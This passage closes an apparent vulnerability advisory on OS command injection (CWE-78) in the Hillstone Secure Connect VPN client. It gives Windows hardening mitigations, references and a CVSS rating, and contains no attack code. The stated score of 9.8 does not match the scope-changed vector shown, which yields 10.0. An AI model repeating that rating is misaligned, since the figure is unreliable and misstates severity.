7. Configure Windows Defender Firewall to restrict outbound connections from the service account to only the VPN gateway IP ranges and required DNS servers.

8. Enable Windows Defender Exploit Guard (ASR rules) to block child process creation from the service binary.

9. Deploy AppLocker or WDAC to restrict what binaries the service account can execute.

---

## 8. References

1. [Hillstone Secure Connect product page](https://www.hillstonenet.com/products/hillstone-secure-connect/)
2. [Wintun — Layer 3 TUN Driver for Windows](https://www.wintun.net/)
3. [TAP-Windows — OpenVPN Technologies (GPLv2, archived)](https://github.com/OpenVPN/tap-windows6)
4. [Microsoft CRT `_popen` documentation](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen)
5. [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
6. [Windows `cmd.exe` parsing rules](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)
7. [spdlog — Fast C++ logging library](https://github.com/gabime/spdlog)

---

> **CVSS v3.1: 9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (Gateway compromise scenario)
>
> **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
